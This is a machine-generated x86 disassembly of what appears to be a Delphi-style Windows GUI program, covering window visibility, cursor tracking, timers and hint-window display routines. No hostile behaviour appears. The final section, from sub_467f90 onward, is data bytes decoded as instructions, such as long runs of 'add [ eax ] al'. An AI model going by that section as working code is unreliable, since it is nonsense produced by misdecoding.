mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0x10 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4670e7
lea eax [ ebp - 0x4 ]
call sub_404120
retn
sub_4670f8
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x88 ]
je r-xdata
pop esi
pop ebx
retn
mov eax edx
mov [ ebx + 0x88 ] al
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_403390
xor eax eax
mov [ ebx + 0x84 ] eax
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x2c ]
mov esi eax
mov [ ebx + 0x84 ] esi
mov edx [ ebx + 0x5c ]
mov eax esi
call sub_447124
jmp r-xdata
sub_467148
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_46464c
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
call sub_44d7a4
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_464638
mov ebx eax
mov eax ebx
call sub_44daa8
test al al
je r-xdata
mov eax ebx
call sub_44d7a4
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xdc ]
sub_4671ac
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx eax
push esp
call GetCursorPos
mov eax esp
mov dl 0x1
call sub_445830
mov edi eax
call sub_44412c
mov esi eax
cmp edi [ ebx + 0x48 ]
je r-xdata
mov eax edi
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x0
je r-xdata
test esi esi
je r-xdata
test esi esi
je r-xdata
mov [ ebx + 0x48 ] edi
cmp [ ebx + 0x48 ] 0x0
je r-xdata
cmp esi [ ebx + 0x48 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb014
mov eax [ ebx + 0x48 ]
call sub_448138
test esi esi
je r-xdata
test esi esi
je r-xdata
cmp esi [ ebx + 0x48 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb013
mov eax [ ebx + 0x48 ]
call sub_448138
sub_467224
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_467334
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4671ac
mov ebx eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_4651b4
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_4440e8
mov edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_4673e4
mov [ ebp - 0x5 ] 0x1
xor eax eax
push ebp
push j_sub_403870#8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x102 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
lea ecx [ ebp - 0x5 ]
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
mov eax [ ebp - 0x4 ]
call sub_46777c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_467148
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor eax eax
call sub_423908
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46733b
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_404144
retn
call WaitMessage
mov [ ebp - 0x5 ] 0x0
sub_467344
push ebx
push esi
push edi
mov edi edx
mov eax [ rw-data ]
call sub_464630
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ rw-data ]
call sub_46461c
movzx edx di
xor ecx ecx
call sub_448138
inc esi
dec ebx
jne r-xdata
sub_467380
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_4663f4
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_4663f4
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
jmp r-xdata
mov dx 0xb01d
mov eax ebx
call sub_467344
pop ebx
retn
push 0xffffffff
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call InvalidateRect
sub_4673e4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x54 ]
mov edx esi
call sub_40452c
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
lea eax [ ebx + 0x54 ]
mov edx esi
call sub_404174
cmp [ ebx + 0xfa ] 0x0
je r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_440eb0
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_453a24
xor eax eax
push ebp
push sub_467469
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_40358c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403390
retn
mov edx ebx
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
jmp r-xdata
sub_467478
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsWindowVisible
cmp eax 0x1
sbb eax eax
inc eax
cmp al [ rw-data ]
jne r-xdata
pop ebx
pop ebp
retn
cmp bl [ rw-data ]
je r-xdata
xor eax eax
mov al bl
movzx eax [ eax * 2 + rw-data ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
mov [ rw-data ] bl
sub_4674d4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_464630
mov esi eax
dec esi
test esi esi
jl r-xdata
push ebp
xor eax eax
call sub_467478
pop ecx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_46461c
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
push ebp
mov al 0x1
call sub_467478
pop ecx
jmp r-xdata
mov eax ebx
call sub_44daa8
test al al
jne r-xdata
mov eax [ ebx + 0x190 ]
push eax
mov eax ebx
call sub_44d7a4
push eax
call IsChild
test eax eax
jne r-xdata
sub_46755c
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x4c ] 0x0
jne r-xdata
cmp [ esi + 0x4c ] 0x0
je r-xdata
lea eax [ esi + 0x4c ]
call sub_405b50
call sub_42f494
mov eax ebx
pop esi
pop ebx
retn
mov bl 0x1
sub_467584
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov eax edi
call sub_4675c8
push sub_46520c
push esi
push 0x0
push 0x0
call SetTimer
mov [ edi + 0x8a ] ax
mov [ edi + 0x89 ] bl
cmp [ edi + 0x8a ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_46777c
sub_4675f0
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebp ecx
mov edi edx
mov esi eax
lea edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
call sub_406eec
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax edi
call sub_446a9c
lea eax [ esp + 0x10 ]
mov dl 0x1
call sub_445830
call sub_4651ec
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_46777c
jmp r-xdata
cmp [ ebx + 0x99 ] 0x0
jne r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebx [ esi + 0x60 ]
jne r-xdata
mov al [ esi + 0x58 ]
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
call sub_406eec
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax edi
call sub_446a9c
push [ esp + 0x14 ]
push [ esp + 0x14 ]
lea eax [ esi + 0x64 ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esi + 0x78 ]
mov [ esp ] eax
mov eax [ esi + 0x80 ]
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_46777c
mov al [ esp + 0x4 ]
mov [ esi + 0x58 ] al
mov [ esi + 0x60 ] ebx
xor ecx ecx
mov edx [ esp ]
mov eax esi
call sub_467584
cmp [ esp ] 0x0
jne r-xdata
mov eax esp
push eax
xor ecx ecx
mov cl [ esp + 0x8 ]
mov edx 0xb041
mov eax ebx
call sub_448138
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov al [ esp + 0x4 ]
mov [ esi + 0x58 ] al
mov [ esi + 0x60 ] ebx
lea eax [ esp + 0x5 ]
push eax
call GetCursorPos
lea edx [ esp + 0x5 ]
mov eax esi
call sub_467a14
jmp r-xdata
sub_467700
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_4675c8
mov al [ ebx + 0x89 ]
sub al 0x1
jb r-xdata
push esp
call GetCursorPos
mov edx esp
mov eax ebx
call sub_467a14
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov eax ebx
call sub_467738
jmp r-xdata
sub_467738
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x84 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_44daa8
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_44d7a4
push eax
call IsWindowVisible
test eax eax
je r-xdata
push 0x0
mov eax [ ebx + 0x84 ]
call sub_44d7a4
push eax
call ShowWindow
sub_46777c
push ebx
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
call sub_467738
xor eax eax
mov [ ebx + 0x60 ] eax
mov [ ebx + 0x58 ] 0x0
call sub_465374
mov eax ebx
call sub_4675c8
sub_4677b4
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x28 ]
push eax
call GetCursor
push eax
call GetIconInfo
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor edx edx
push ebp
push sub_4678f6
push [ fs : edx ]
mov [ fs : edx ] esp
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
call sub_428ff0
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
call sub_408084
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_4678c7
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ ebp - 0x10 ]
add ebx [ ebp - 0x8 ]
push ebx
mov esi [ ebp - 0x10 ]
mov ecx esi
xor edx edx
mov eax [ ebp - 0x1c ]
call sub_4290a8
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4678ce
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_4027d4
retn
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xe ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx eax
movzx ecx [ esi + 0xe ]
imul edx ecx
add edx 0x1f
and edx 0xffffffe0
test edx edx
jns r-xdata
sar edx 0x3
mov [ ebp - 0x14 ] edx
mov edi eax
imul edi [ ebp - 0x14 ]
add ebx [ ebp - 0xc ]
sub ebx edi
mov ecx 0xff
mov edx edi
mov eax ebx
call sub_4677a4
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
add edx 0x7
mov eax [ ebp - 0x4 ]
cdq
idiv [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x20 ]
sub [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
add edx edx
cmp eax edx
jl r-xdata
mov eax ebx
sub eax edi
xor ecx ecx
mov edx edi
call sub_4677a4
mov [ ebp - 0x4 ] eax
sub_4678ce
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
test eax eax
je r-xdata
push eax
call DeleteObject
retn
push eax
call DeleteObject
sub_467908
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x84 ]
test esi esi
je r-xdata
mov ebx [ rw-data ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
call sub_403390
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov dl 0x1
mov eax ebx
call [ eax + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + 0x84 ] eax
mov eax [ ebp + 0x8 ]
mov eax esi
call sub_4032d8
cmp ebx eax
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_467968
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor edx edx
mov [ ebp - 0x8 ] edx
xor edx edx
push ebp
push sub_467a02
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467a09
lea eax [ ebp - 0x8 ]
call sub_404120
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov esi ebx
jmp r-xdata
mov al [ ebx ]
test al al
je r-xdata
mov ecx ebx
sub ecx esi
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_404210
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
mov eax [ eax + 0x208 ]
mov edx [ ebp - 0x8 ]
call sub_427bb0
cmp eax [ ebp - 0x4 ]
jle r-xdata
sub al 0xa
je r-xdata
cmp [ ebx ] 0xd
jne r-xdata
mov [ ebp - 0x4 ] eax
sub al 0x3
jne r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
mov eax ebx
call sub_40c870
mov ebx eax
inc ebx
sub_467a14
push ebp
mov ebp esp
add esp 0xffffff70
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8c ] ecx
mov [ ebp - 0x90 ] ecx
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_404ab8
lea ebx [ ebp - 0x4 ]
xor eax eax
push ebp
push sub_467d9a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov [ eax + 0x58 ] 0x0
mov eax [ ebx ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
mov eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_46777c
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_467584
jmp r-xdata
call sub_45dba4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467da1
lea eax [ ebp - 0x90 ]
mov edx 0x2
call sub_404144
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_404b88
retn
lea eax [ ebp - 0xc ]
mov dl 0x1
call sub_445830
call sub_4651ec
mov edx [ ebx ]
cmp eax [ edx + 0x60 ]
jne r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x54 ] eax
call sub_4677b4
add [ ebp - 0x54 ] eax
mov eax [ rw-data ]
call sub_4645b0
mov [ ebp - 0x50 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x5c ]
mov [ ebp - 0x4c ] eax
lea edx [ ebp - 0x80 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_446924
lea esi [ ebp - 0x80 ]
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x14 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ ebx ]
mov esi [ eax + 0x60 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
jmp r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
call OffsetRect
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0xc ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_446ac8
mov eax [ ebp - 0x88 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x34 ] eax
lea edx [ ebp - 0x90 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_4651b4
mov eax [ ebp - 0x90 ]
lea edx [ ebp - 0x8c ]
call sub_4440a4
mov edx [ ebp - 0x8c ]
lea eax [ ebp - 0x28 ]
call sub_4041b8
xor eax eax
mov [ ebp - 0x30 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebp - 0x2c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x5c ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x60 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
xor ecx ecx
mov edx 0xb030
call sub_448138
test eax eax
sete [ ebp - 0x1d ]
cmp [ ebp - 0x1d ] 0x0
je r-xdata
cmp [ esi + 0x190 ] 0x0
je r-xdata
cmp [ ebp - 0x1d ] 0x0
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x190 ]
push eax
call ClientToScreen
xor eax eax
jmp r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
lea eax [ ebp - 0x60 ]
push eax
lea ecx [ ebp - 0x1d ]
lea edx [ ebp - 0x28 ]
mov esi [ ebx ]
mov eax [ esi + 0x134 ]
call [ esi + 0x130 ]
mov edx [ ebx ]
mov [ edx + 0x58 ] al
mov eax [ ebx ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
mov al 0x1
cmp [ ebp - 0x28 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x5c ]
call sub_467908
pop ecx
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov dl [ eax + 0x5f ]
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x50 ]
mov esi [ eax ]
call [ esi + 0xd8 ]
mov eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
call OffsetRect
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov si 0xffc8
call sub_40358c
test al al
je r-xdata
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x48 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_446a9c
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x64 ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x68 ] edx
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_446a9c
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x6c ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x70 ] edx
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov edx [ ebp - 0x4c ]
call sub_447124
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0x28 ]
lea edx [ ebp - 0x70 ]
mov esi [ eax ]
call [ esi + 0xd4 ]
call sub_465300
mov eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
push ebp
mov eax [ ebp - 0x28 ]
call sub_467968
pop ecx
add eax 0x5
sub [ ebp - 0x70 ] eax
sub [ ebp - 0x68 ] eax
mov cl 0x1
mov edx [ ebp - 0x2c ]
mov eax [ ebx ]
call sub_467584
jmp r-xdata
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_467584
jmp r-xdata
sub_467da8
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ rw-data ]
mov ebx [ eax + 0x68 ]
test ebx ebx
je r-xdata
mov eax edi
mov edx [ esi + 0x50 ]
call sub_404174
cmp [ ebx + 0x23c ] 0x0
je r-xdata
mov eax edi
mov edx [ ebx + 0x23c ]
call sub_404174
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_467e08
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov [ ebx + 0xb0 ] esi
pop esi
pop ebx
retn
push esi
push 0x0
push 0xb031
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
sub_467e34
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx ecx
mov [ esp ] edx
mov esi eax
mov eax [ rw-data ]
mov edi [ eax + 0x6c ]
test edi edi
je r-xdata
mov ebp [ esi + 0x44 ]
cmp edi ebp
je r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax edi
call sub_448138
dec eax
je r-xdata
xor eax eax
jmp r-xdata
test ebp ebp
je r-xdata
mov al 0x1
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
jne r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax ebp
call sub_448138
dec eax
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
cmp [ ebx + 0x42 ] 0x0
setne dl
mov eax ebx
call sub_4538ec
sub_467ec4
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_467eec
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xca ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_467f90
add [ eax ] eax
add [ eax ] al
or al 0xef
inc edi
add ah al
cmp [ eax + eax ] eax
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_467ff3
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467ffa
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_45d950
mov eax sub_45dbd0
call sub_41affc
mov eax [ rw-data ]
push eax
call CloseHandle
sub_46803f
add [ eax + eax * 4 + 0x46 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ eax + 0xc0046 ] es
add [ eax ] al
nop
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
add [ esi ] 0xc
add [ eax ] al
add [ eax - 0x80 ] al
inc esi
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + 0x15004033 ] al
inc ebp
dec ecx
dec ecx
outsb
jbe r-xdata
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + 0xc004033 ] al
inc ebp
dec ecx
inc ebp
js r-xdata
outsb
jbe r-xdata
insb
imul esp [ ebx + edx * 2 + 0x65 ] 0x63697672
dec esi
jbe r-xdata
jo r-xdata
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
insb
imul esp [ ebx + edx * 2 + 0x6f ] 0x74656b63
lea eax [ eax ]
lodsb [ esi ]
add [ esi ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al 0x81
inc esi
add [ eax ] dl
add [ eax ] al
add [ eax - 0x80 ] al
inc esi
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax - 0x3fffbfcd ] al
add [ esi ] 0x6449450e
push ebx
popad
insd
mov eax eax
dec esp
add [ esi ] 0x0
add [ eax ] al
arpl [ ebp + 0x4e ] sp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec esp
add [ esi ] 0xc
inc eax
add [ esi ] 0xd8
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + 0x10004033 ] al
inc ebp
dec ecx
dec ecx
imul ebp [ edi + 0x6e ] 0xe800408d
add [ esi ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop ebx
pop ebp
retn 0x4
jb r-xdata
mov eax 0xf8ebfff9
pop ebp
retn
outsd
jb r-xdata
dec ecx
sub_468104
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec esp
add [ esi ] 0xc
inc eax
add [ esi ] 0xd8
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + 0x10004033 ] al
inc ebp
dec ecx
dec ecx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
insb
imul esp [ ebx + edx * 2 + 0x6f ] 0x74656b63
lea eax [ eax ]
lodsb [ esi ]
add [ esi ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al 0x81
inc esi
add [ eax ] dl
add [ eax ] al
add [ eax - 0x80 ] al
inc esi
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
